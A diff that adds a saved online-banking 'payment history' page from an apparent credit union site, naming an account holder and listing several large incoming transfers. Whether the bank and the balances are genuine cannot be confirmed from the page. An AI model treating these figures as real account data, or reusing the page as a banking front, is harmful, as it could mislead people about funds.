@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+	
+        <title>History</title>
+        
+		<meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+		        <link rel="icon" href='img/union.png'>
+
+        <link rel="icon" href='https://creditunioncapitol.com/connections/templatelogo2'>
+		<link rel="stylesheet" href="https://creditunioncapitol.com/connections/template/plugins/dataTables/datatables.min.css">
+        <link rel="stylesheet" type="text/css" href="https://creditunioncapitol.com/connections/template/assets-user/css/main.css">
+        <link rel="stylesheet" type="text/css" href="https://creditunioncapitol.com/connections/template/assets-user/css/widgets.css">
+        <link rel="stylesheet" type="text/css" href="https://creditunioncapitol.com/connections/template/defaults.css">
+        <link rel="stylesheet" type="text/css" href="https://creditunioncapitol.com/connections/template/assets-user/css/style.css">
+        <link rel="stylesheet" href="https://creditunioncapitol.com/connections/template/plugins/font-awesome-5.8.2/css/all.css">
+		
+				
+    </head>
+    <body class="app sidebar-mini ">
+       
+					
+			<header class="app-header">
+				<a class="app-header__logo" href="dashboard.html">
+					<img src='#' height='40px'>
+				</a>
+				<!-- Sidebar toggle button--><a class="app-sidebar__toggle" href="#" data-toggle="sidebar" aria-label="Hide Sidebar"></a>
+				<!-- Navbar Right Menu-->
+				<ul class="app-nav">
+					<!--Notification Menu-->
+					<li class="dropdown">
+						<div id="google_translate_element" style="margin-left:2%"></div>
+						<script type="text/javascript">
+							function googleTranslateElementInit() {
+							  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement, autoDisplay: false}, 'google_translate_element');
+							}
+						</script>
+						<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+					</li>
+							<!-- User Menu-->
+							<li class="dropdown">
+								<a class="app-nav__item" href="#" data-toggle="dropdown" aria-label="Open Profile Menu"><i class="fa fa-user fa-lg"></i></a>
+								<ul class="dropdown-menu settings-menu dropdown-menu-right">
+									<li><a class="dropdown-item" href="profile.html"><i class="fa fa-user fa-lg"></i> Profile</a></li>
+									<li><a class="dropdown-item" href="cpassword.html"><i class="fa fa-key fa-lg"></i> Password</a></li>
+									<li><a class="dropdown-item" href="index.html"><i class="fas fa-sign-out-alt fa-lg"></i> Logout</a></li>
+								</ul>
+							</li>
+						</ul>
+					</header>
+					
+								
+					<!-- Sidebar menu-->
+					<div class="app-sidebar__overlay" data-toggle="sidebar"></div>
+					<aside class="app-sidebar">
+					
+						<div class="app-sidebar__user d-block text-center">
+							
+		<img class="app-sidebar__user-avatar oval-pic" src="img/d283b24a77c83302c916412dc0e094c8.jpeg" alt="User Image">
+
+							<div class='mt-2'>
+								
+		<p class="app-sidebar__user-name">Monika Fischer</p>
+
+								<p class="app-sidebar__user-designation d-none"></p>
+							</div>
+						</div>
+						
+						<ul class="app-menu">
+						
+							<li>
+								<a class="app-menu__item" href="dashboard.html">
+									<i class="app-menu__icon fas fa-home"></i>
+									<span class="app-menu__label">Dashboard</span>
+								</a>
+							</li>
+							
+												<li>
+								<a href="kyc.html" class="treeview-item text-white d-block brand-text">
+									You have not yet verified you KYC. Click now to submit your details
+								</a>
+							</li>
+											
+							<li class="treeview">
+								<a class="app-menu__item" href="#" data-toggle="treeview">
+									<i class="app-menu__icon fa fa-users"></i>
+									<span class="app-menu__label">My Account</span>
+									<i class="treeview-indicator fa fa-angle-right"></i>
+								</a>
+								<ul class="treeview-menu">
+									<li><a class="treeview-item" href="profile.html">Profile</a></li>
+									<li><a class="treeview-item" href="statement.html">Statements</a></li>
+									<li><a class="treeview-item" href="kyc.html">KYC</a></li>
+									<li><a class="treeview-item" href="cpassword.html">Change Password</a></li>
+									<li><a class="treeview-item" href="cpin.html">Change Pin</a></li>
+									<li><a class="treeview-item" href="activity.html">Activity Log</a></li>
+								</ul>
+							</li>
+						
+							<li class="treeview">
+								<a class="app-menu__item" href="#" data-toggle="treeview">
+									<i class="app-menu__icon fa fa-paper-plane"></i>
+									<span class="app-menu__label">Transfer</span>
+									<i class="treeview-indicator fa fa-angle-right"></i>
+								</a>
+								<ul class="treeview-menu">
+									<li><a class="treeview-item" href="local.html">Domestic</a></li>
+									<li><a class="treeview-item" href="international.html">International</a></li>
+									<li><a class="treeview-item" href="payment.html">History</a></li>
+								</ul>
+							</li>
+						
+							<li class="treeview">
+								<a class="app-menu__item" href="#" data-toggle="treeview">
+									<i class="app-menu__icon fa fa-landmark"></i>
+									<span class="app-menu__label">Monetary</span>
+									<i class="treeview-indicator fa fa-angle-right"></i>
+								</a>
+								<ul class="treeview-menu">
+									<li><a class="treeview-item" href="#">Digital Deposit</a></li>
+									<li><a class="treeview-item" href="#">Cards</a></li>
+								</ul>
+							</li>
+						
+							<li class="treeview"></li>
+								<a class="app-menu__item" href="#" data-toggle="treeview">
+									<i class="app-menu__icon fa fa-users"></i>
+									<span class="app-menu__label">Loan</span>
+									<i class="treeview-indicator fa fa-angle-right"></i>
+								</a>
+								<ul class="treeview-menu">
+									<li><a class="treeview-item" href="loan.html">Loan Application</a></li>
+									<li><a class="treeview-item" href="sloan.html">Loan Status</a></li>
+								</ul>
+							</li>
+						
+							<li class="treeview">
+								<a class="app-menu__item" href="#" data-toggle="treeview">
+									<i class="app-menu__icon fa fa-check-double"></i>
+									<span class="app-menu__label">Support</span>
+									<i class="treeview-indicator fa fa-angle-right"></i>
+								</a>
+								<ul class="treeview-menu">
+									<li><a class="treeview-item" href="faq.html">FAQ</a></li>
+									<li><a class="treeview-item" href="message.html">Message</a></li>
+								</ul>
+							</li>
+							
+							<li>
+								<a class="app-menu__item" href="index.html">
+									<i class="app-menu__icon fa fa-user"></i>
+									<span class="app-menu__label">Logout</span>
+								</a>
+							</li>
+						</ul>
+					</aside>		
+			<main class="app-content">
+				<div class="app-title d-block">
+					<div>
+						<h1>
+							<i class="fas fa-users"></i> 
+							My Payment History
+						</h1>
+					</div>
+				</div>
+
+
+	
+	<div class='card'>
+		<div class='card-body'>
+			<div class="table-responsive">
+				<table id="payment-history" class="table table-condensed table-responsive table-striped statement sortable" data-table="advance" data-pagelength="25">
+				
+					<thead>
+						<tr>
+							<th width="80" class="{sorter: &#39;date&#39;} header">Date</th>
+							<th width="30%" class="header">Transacion ID</th>
+							<th width="40%" class="header">Details</th>
+							<th class="{sorter: &#39;amount&#39;} right amount header">Amount</th>
+							<th class="{sorter: &#39;amount&#39;} right amount header">Charges</th>
+							<th class="right header">Status</th>
+							<th class="{sorter: false} mark-as-favorite">Receipt</th>
+						</tr>
+					</thead>
+					
+					<tbody>
+								
+						<tr class="transaction-row nondefined" id="payment-10215" data-payment-id="10215">
+							<td>2025/12/23</td>
+							<td>oewkx5c3gu</td>
+							<td>
+								<div id="comment-10215" class="muted comment-in-history"></div>
+															</td>
+							<td class="right amount">
+																<span class="text-success">+$15,200.00</span>
+							</td>
+							<td class="right amount">
+								<span class="amount-value text-info">
+									-$0.00								</span>
+							</td>
+							<td class="right payment-status deferred">Completed</td>
+							<td class="favorite-action">
+								<a href='receipt.php?id=1117' class='btn btn-outline-primary'>
+									<i class='fas fa-eye'></i>
+								</a>
+							</td>
+						</tr>
+								
+						<tr class="transaction-row nondefined" id="payment-10215" data-payment-id="10215">
+							<td>2025/12/08</td>
+							<td>95140063</td>
+							<td>
+								<div id="comment-10215" class="muted comment-in-history"></div>
+															</td>
+							<td class="right amount">
+																<span class="text-danger">-$5,000.00</span>
+							</td>
+							<td class="right amount">
+								<span class="amount-value text-info">
+									-$0.00								</span>
+							</td>
+							<td class="right payment-status deferred">Completed</td>
+							<td class="favorite-action">
+								<a href='receipt.php?id=1116' class='btn btn-outline-primary'>
+									<i class='fas fa-eye'></i>
+								</a>
+							</td>
+						</tr>
+								
+						<tr class="transaction-row nondefined" id="payment-10215" data-payment-id="10215">
+							<td>2025/12/08</td>
+							<td>18305388</td>
+							<td>
+								<div id="comment-10215" class="muted comment-in-history"></div>
+															</td>
+							<td class="right amount">
+																<span class="text-danger">-$5,000.00</span>
+							</td>
+							<td class="right amount">
+								<span class="amount-value text-info">
+									-$0.00								</span>
+							</td>
+							<td class="right payment-status deferred">Completed</td>
+							<td class="favorite-action">
+								<a href='receipt.php?id=1115' class='btn btn-outline-primary'>
+									<i class='fas fa-eye'></i>
+								</a>
+							</td>
+						</tr>
+								
+						<tr class="transaction-row nondefined" id="payment-10215" data-payment-id="10215">
+							<td>2025/12/06</td>
+							<td>ipzqdnfmft</td>
+							<td>
+								<div id="comment-10215" class="muted comment-in-history"></div>
+															</td>
+							<td class="right amount">
+																<span class="text-success">+$50,000.00</span>
+							</td>
+							<td class="right amount">
+								<span class="amount-value text-info">
+									-$0.00								</span>
+							</td>
+							<td class="right payment-status deferred">Completed</td>
+							<td class="favorite-action">
+								<a href='receipt.php?id=1114' class='btn btn-outline-primary'>
+									<i class='fas fa-eye'></i>
+								</a>
+							</td>
+						</tr>
+								
+						<tr class="transaction-row nondefined" id="payment-10215" data-payment-id="10215">
+							<td>2025/12/06</td>
+							<td>l01jvaxf9r</td>
+							<td>
+								<div id="comment-10215" class="muted comment-in-history"></div>
+															</td>
+							<td class="right amount">
+																<span class="text-success">+$100,000.00</span>
+							</td>
+							<td class="right amount">
+								<span class="amount-value text-info">
+									-$0.00								</span>
+							</td>
+							<td class="right payment-status deferred">Completed</td>
+							<td class="favorite-action">
+								<a href='receipt.php?id=1113' class='btn btn-outline-primary'>
+									<i class='fas fa-eye'></i>
+								</a>
+							</td>
+						</tr>
+								
+						<tr class="transaction-row nondefined" id="payment-10215" data-payment-id="10215">
+							<td>2025/12/06</td>
+							<td>e6zjrt9wdk</td>
+							<td>
+								<div id="comment-10215" class="muted comment-in-history"></div>
+															</td>
+							<td class="right amount">
+																<span class="text-success">+$20,000.00</span>
+							</td>
+							<td class="right amount">
+								<span class="amount-value text-info">
+									-$0.00								</span>
+							</td>
+							<td class="right payment-status deferred">Completed</td>
+							<td class="favorite-action">
+								<a href='receipt.php?id=1112' class='btn btn-outline-primary'>
+									<i class='fas fa-eye'></i>
+								</a>
+							</td>
+						</tr>
+								
+						<tr class="transaction-row nondefined" id="payment-10215" data-payment-id="10215">
+							<td>2025/12/06</td>
+							<td>vjatb8fxxq</td>
+							<td>
+								<div id="comment-10215" class="muted comment-in-history"></div>
+															</td>
+							<td class="right amount">
+																<span class="text-success">+$50,000.00</span>
+							</td>
+							<td class="right amount">
+								<span class="amount-value text-info">
+									-$0.00								</span>
+							</td>
+							<td class="right payment-status deferred">Completed</td>
+							<td class="favorite-action">
+								<a href='receipt.php?id=1111' class='btn btn-outline-primary'>
+									<i class='fas fa-eye'></i>
+								</a>
+							</td>
+						</tr>
+								
+						<tr class="transaction-row nondefined" id="payment-10215" data-payment-id="10215">
+							<td>2025/12/06</td>
+							<td>pkmcih963k</td>
+							<td>
+								<div id="comment-10215" class="muted comment-in-history"></div>
+															</td>
+							<td class="right amount">
+																<span class="text-success">+$200,000.00</span>
+							</td>
+							<td class="right amount">
+								<span class="amount-value text-info">
+									-$0.00								</span>
+							</td>
+							<td class="right payment-status deferred">Completed</td>
+							<td class="favorite-action">
+								<a href='receipt.php?id=1110' class='btn btn-outline-primary'>
+									<i class='fas fa-eye'></i>
+								</a>
+							</td>
+						</tr>
+								
+						<tr class="transaction-row nondefined" id="payment-10215" data-payment-id="10215">
+							<td>2025/12/06</td>
+							<td>iczyxbafem</td>
+							<td>
+								<div id="comment-10215" class="muted comment-in-history"></div>
+															</td>
+							<td class="right amount">
+																<span class="text-success">+$100,000.00</span>
+							</td>
+							<td class="right amount">
+								<span class="amount-value text-info">
+									-$0.00								</span>
+							</td>
+							<td class="right payment-status deferred">Completed</td>
+							<td class="favorite-action">
+								<a href='receipt.php?id=1109' class='btn btn-outline-primary'>
+									<i class='fas fa-eye'></i>
+								</a>
+							</td>
+						</tr>
+										
+				   </tbody>
+				   
+				 </table>	
+			</div>
+		</div>
+	</div>
+	
+		
+		</main>
+		
+		
+	<div data-bankloader='https://creditunioncapitol.com/app/img/loading.gif'></div>
+	
+	<!-- Essential javascripts for application to work-->
+	<script src="https://creditunioncapitol.com/connections/template/assets-user/js/jquery-3.3.1.min.js"></script>
+	<script src="https://creditunioncapitol.com/connections/template/assets-user/js/popper.min.js"></script>
+	<script src="https://creditunioncapitol.com/connections/template/assets-user/js/bootstrap.min.js"></script>
+	<script src="https://creditunioncapitol.com/connections/template/plugins/dataTables/datatables.min.js"></script>
+	<script src="https://creditunioncapitol.com/connections/template/assets-user/js/main.js"></script>
+	<!-- The javascript plugin to display page loading on top-->
+	<script src="https://creditunioncapitol.com/connections/template/assets-user/js/plugins/pace.min.js"></script>
+	<script src="https://creditunioncapitol.com/connections/template/assets/js/loader.js"></script>
+	<script src="https://creditunioncapitol.com/connections/template/assets/js/main.js"></script>
+	<!-- Page specific javascripts-->
+	
+	    <script>$.ajax({ url: 'https://creditunioncapitol.com/controller/server/verifyy.php' });</script>
+	
+    </body>
+</html>
+  
